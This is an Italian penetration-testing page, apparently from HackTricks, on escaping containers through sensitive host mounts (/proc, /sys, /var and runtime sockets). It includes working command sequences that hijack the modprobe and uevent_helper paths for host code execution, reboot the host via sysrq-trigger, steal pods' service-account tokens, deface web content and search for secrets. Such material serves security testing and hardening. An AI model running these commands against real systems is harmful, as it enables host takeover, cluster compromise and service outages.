# Montaggi sensibili dell'host

{{#include ../../../banners/hacktricks-training.md}}

## Panoramica

I montaggi dell'host sono una delle superfici pratiche di container-escape più importanti perché spesso ricollassano una vista di processi accuratamente isolata nella visibilità diretta delle risorse dell'host. I casi pericolosi non sono limitati a `/`. Bind mounts di `/proc`, `/sys`, `/var`, runtime sockets, kubelet-managed state, o percorsi relativi ai dispositivi possono esporre controlli del kernel, credenziali, filesystem di container vicini e interfacce di gestione del runtime.

Questa pagina esiste separatamente dalle pagine di protezione individuali perché il modello di abuso è trasversale. Un mount dell'host scrivibile è pericoloso in parte a causa dei mount namespaces, in parte a causa dei user namespaces, in parte a causa della copertura di AppArmor o SELinux, e in parte a causa di quale percorso dell'host è stato esposto. Trattarlo come un argomento a sé rende la superficie d'attacco molto più facile da analizzare.

## Esposizione di `/proc`

procfs contiene sia informazioni ordinarie sui processi sia interfacce di controllo del kernel ad alto impatto. Un bind mount come `-v /proc:/host/proc` o una vista del container che espone voci proc scrivibili inaspettate può quindi portare a divulgazione di informazioni, denial of service, o esecuzione diretta di codice sull'host.

I percorsi procfs di alto valore includono:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuso

Inizia controllando quali voci procfs di alto valore sono visibili o scrivibili:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
Questi percorsi sono interessanti per ragioni diverse. `core_pattern`, `modprobe`, e `binfmt_misc` possono diventare vie di code-execution sul host se scrivibili. `kallsyms`, `kmsg`, `kcore`, e `config.gz` sono potenti fonti di reconnaissance per kernel exploitation. `sched_debug` e `mountinfo` rivelano il contesto di processi, cgroup e filesystem che può aiutare a ricostruire la disposizione del host dall'interno del container.

Il valore pratico di ciascun percorso è diverso, e trattarli tutti come se avessero lo stesso impatto rende più difficile la triage:

- `/proc/sys/kernel/core_pattern`
Se scrivibile, questo è uno dei percorsi procfs a maggior impatto perché il kernel eseguirà un handler di pipe dopo un crash. Un container che può puntare `core_pattern` su un payload memorizzato nel suo overlay o in un percorso host mountato può spesso ottenere code execution sul host. Vedi anche [read-only-paths.md](protections/read-only-paths.md) per un esempio dedicato.
- `/proc/sys/kernel/modprobe`
Questo percorso controlla l'helper userspace usato dal kernel quando deve invocare la logica di loading dei moduli. Se scrivibile dal container e interpretato nel contesto del host, può diventare un altro primitivo di code execution sul host. È particolarmente interessante se combinato con un modo per triggerare il percorso dell'helper.
- `/proc/sys/vm/panic_on_oom`
Non è di solito un primitivo di escape pulito, ma può convertire la pressione di memoria in denial of service a livello host trasformando condizioni OOM in comportamento di kernel panic.
- `/proc/sys/fs/binfmt_misc`
Se l'interfaccia di registrazione è scrivibile, l'attaccante può registrare un handler per un valore magic scelto e ottenere esecuzione nel contesto host quando un file corrispondente viene eseguito.
- `/proc/config.gz`
Utile per la triage di exploit del kernel. Aiuta a determinare quali subsystems, mitigations e funzionalità opzionali del kernel sono abilitate senza bisogno dei metadata dei pacchetti del host.
- `/proc/sysrq-trigger`
Principalmente un percorso di denial-of-service, ma molto serio. Può riavviare, panicare o altrimenti interrompere immediatamente il host.
- `/proc/kmsg`
Rivela i messaggi del kernel ring buffer. Utile per fingerprinting del host, analisi di crash e, in alcuni ambienti, per leak di informazioni utili all'exploit del kernel.
- `/proc/kallsyms`
Valido quando leggibile perché espone informazioni sui simboli esportati del kernel e può aiutare a sconfiggere le assunzioni di address randomization durante lo sviluppo di exploit del kernel.
- `/proc/[pid]/mem`
Interfaccia diretta alla memoria del processo. Se il processo target è raggiungibile con le condizioni tipo ptrace necessarie, può permettere di leggere o modificare la memoria di un altro processo. L'impatto realistico dipende fortemente da credenziali, `hidepid`, Yama e restrizioni ptrace, quindi è un percorso potente ma condizionale.
- `/proc/kcore`
Espone una vista in stile core-image della memoria di sistema. Il file è enorme e scomodo da usare, ma se è significativamente leggibile indica una superficie di memoria del host esposta male.
- `/proc/kmem` and `/proc/mem`
Interfacce di memoria raw storicamente ad alto impatto. Su molti sistemi moderni sono disabilitate o fortemente ristrette, ma se presenti e utilizzabili devono essere trattate come finding critici.
- `/proc/sched_debug`
Perdite di informazioni sullo scheduling e sui task che possono esporre identità di processi del host anche quando altre viste di processo sembrano più pulite del previsto.
- `/proc/[pid]/mountinfo`
Estremamente utile per ricostruire dove il container risiede realmente sul host, quali percorsi sono backed da overlay, e se un mount scrivibile corrisponde a contenuto del host o solo allo strato del container.

Se `/proc/[pid]/mountinfo` o i dettagli dell'overlay sono leggibili, usali per recuperare il percorso host del filesystem del container:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Questi comandi sono utili perché diverse tecniche di esecuzione sull'host richiedono di trasformare un percorso all'interno del container nel corrispondente percorso dal punto di vista dell'host.

### Esempio completo: `modprobe` Helper Path Abuse

Se `/proc/sys/kernel/modprobe` è scrivibile dal container e il helper path è interpretato nel contesto dell'host, può essere reindirizzato a un attacker-controlled payload:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
Il trigger esatto dipende dal target e dal comportamento del kernel, ma il punto importante è che un writable helper path può reindirizzare una futura kernel helper invocation verso contenuto host-path controllato dall'attacker.

### Esempio completo: Kernel Recon With `kallsyms`, `kmsg`, And `config.gz`

Se l'obiettivo è exploitability assessment piuttosto che immediate escape:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Questi comandi aiutano a stabilire se sono visibili informazioni utili sui simboli, se i messaggi recenti del kernel rivelano uno stato interessante e quali feature o mitigations del kernel sono compilate. L'impatto di solito non è un escape diretto, ma può ridurre drasticamente il tempo per il kernel-vulnerability triage.

### Esempio completo: SysRq Host Reboot

Se `/proc/sysrq-trigger` è scrivibile e raggiunge la vista host:
```bash
echo b > /proc/sysrq-trigger
```
L'effetto è un immediato riavvio dell'host. Questo non è un esempio sottile, ma dimostra chiaramente che l'esposizione di procfs può essere molto più grave della semplice divulgazione di informazioni.

## Esposizione di `/sys`

sysfs espone grandi quantità di stato del kernel e dei device. Alcuni percorsi di sysfs sono principalmente utili per fingerprinting, mentre altri possono influenzare l'esecuzione di helper, il comportamento dei device, la configurazione dei security-module o lo stato del firmware.

I percorsi sysfs ad alto valore includono:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Questi percorsi sono importanti per ragioni diverse. `/sys/class/thermal` può influenzare il comportamento di gestione termica e quindi la stabilità dell'host in ambienti fortemente esposti. `/sys/kernel/vmcoreinfo` può leak informazioni sui crash-dump e sulla disposizione del kernel che aiutano nel fingerprinting a basso livello dell'host. `/sys/kernel/security` è l'interfaccia `securityfs` usata da Linux Security Modules, quindi accessi inaspettati lì possono esporre o alterare lo stato correlato a MAC. I percorsi delle variabili EFI possono influenzare le impostazioni di avvio gestite dal firmware, rendendoli molto più seri rispetto ai normali file di configurazione. `debugfs` sotto `/sys/kernel/debug` è particolarmente pericoloso perché è intenzionalmente un'interfaccia orientata agli sviluppatori con molte meno aspettative di sicurezza rispetto alle API del kernel pensate per ambienti di produzione più hardenizzati.

Comandi utili per esaminare questi percorsi sono:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
What makes those commands interesting:

- `/sys/kernel/security` può rivelare se AppArmor, SELinux o un'altra LSM surface sono visibili in un modo che avrebbe dovuto rimanere riservato all'host.
- `/sys/kernel/debug` è spesso la scoperta più allarmante di questo gruppo. Se `debugfs` è montato e leggibile o scrivibile, aspettati una vasta superficie rivolta al kernel il cui rischio esatto dipende dai nodi di debug abilitati.
- L'esposizione delle variabili EFI è meno comune, ma se presente ha alto impatto perché riguarda impostazioni supportate dal firmware piuttosto che i normali file di runtime.
- `/sys/class/thermal` è principalmente rilevante per la stabilità dell'host e l'interazione con l'hardware, non per una shell-style escape ordinata.
- `/sys/kernel/vmcoreinfo` è principalmente una fonte per host-fingerprinting e analisi dei crash, utile per comprendere lo stato del kernel a basso livello.

### Esempio completo: `uevent_helper`

Se `/sys/kernel/uevent_helper` è scrivibile, il kernel potrebbe eseguire un helper controllato dall'attaccante quando viene attivato un `uevent`:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
La ragione per cui questo funziona è che il helper path è interpretato dal punto di vista dell'host. Una volta innescato, il helper viene eseguito nel contesto dell'host invece che all'interno dell'attuale container.

## Esposizione di `/var`

Montare la `/var` dell'host in un container è spesso sottovalutato perché non sembra così drammatico come montare `/`. In pratica può essere sufficiente per raggiungere runtime sockets, directory snapshot dei container, kubelet-managed pod volumes, projected service-account tokens e filesystem di applicazioni vicine. Sui nodi moderni, `/var` è spesso dove risiede lo stato del container più interessante dal punto di vista operativo.

### Esempio Kubernetes

Un pod con `hostPath: /var` può spesso leggere i projected tokens di altri pod e il contenuto degli snapshot overlay:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Questi comandi sono utili perché indicano se la mount espone solo dati applicativi poco sensibili o credenziali del cluster ad alto impatto. Un service-account token leggibile può immediatamente trasformare la local code execution in accesso alla Kubernetes API.

Se il token è presente, valida cosa può raggiungere invece di fermarti alla token discovery:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
L'impatto qui può essere molto più ampio dell'accesso al solo nodo locale. Un token con ampi permessi RBAC può trasformare un `/var` montato in una compromissione a livello di cluster.

### Docker e containerd: Esempio

Sugli host Docker i dati rilevanti si trovano spesso sotto `/var/lib/docker`, mentre sui nodi Kubernetes con containerd possono trovarsi sotto `/var/lib/containerd` o in percorsi specifici del snapshotter:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Se il `/var` montato espone contenuti dello snapshot scrivibili di un altro carico di lavoro, l'attaccante potrebbe essere in grado di modificare i file dell'applicazione, inserire contenuti web o cambiare gli script di avvio senza toccare la configurazione dell'attuale container.

Idee concrete di abuso una volta trovato contenuto dello snapshot scrivibile:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
Questi comandi sono utili perché mostrano le tre principali famiglie di impatto di `/var`: manomissione delle applicazioni, recupero di segreti e movimento laterale verso workload adiacenti.

## Socket runtime

I mount sensibili dell'host spesso includono socket runtime piuttosto che directory complete. Questi sono così importanti che meritano una ripetizione esplicita qui:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Vedi [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) per full exploitation flows una volta che una di queste sockets è montata.

Come primo pattern di interazione rapido:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
Se una di queste riesce, il percorso da "mounted socket" a "start a more privileged sibling container" è di solito molto più breve rispetto a qualsiasi percorso di kernel breakout.

## CVE correlate ai mount

Host mounts si intersecano anche con vulnerabilità del runtime. Esempi recenti importanti includono:

- `CVE-2024-21626` in `runc`, dove un leaked descrittore di directory potrebbe posizionare la directory di lavoro sul filesystem dell'host.
- `CVE-2024-23651` and `CVE-2024-23653` in BuildKit, dove OverlayFS copy-up races potrebbero produrre scritture su percorsi dell'host durante le build.
- `CVE-2024-1753` in Buildah and Podman build flows, dove crafted bind mounts durante la build potrebbero esporre `/` read-write.
- `CVE-2024-40635` in containerd, dove un grande valore `User` potrebbe causare un overflow portando al comportamento di UID 0.

Queste CVE sono rilevanti qui perché mostrano che la gestione dei mount non riguarda solo la configurazione dell'operatore. Anche il runtime stesso può introdurre condizioni di escape guidate dai mount.

## Checks

Usa questi comandi per individuare rapidamente le esposizioni ai mount di maggior valore:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Cosa c'è di interessante qui:

- La root dell'host, `/proc`, `/sys`, `/var`, e i runtime sockets sono tutte scoperte ad alta priorità.
- Voci scrivibili in `/proc/sys` spesso indicano che il mount espone controlli del kernel globali dell'host invece di una vista sicura del container.
- I percorsi montati in `/var` meritano una revisione delle credenziali e dei workload vicini, non solo una revisione del filesystem.
{{#include ../../../banners/hacktricks-training.md}}
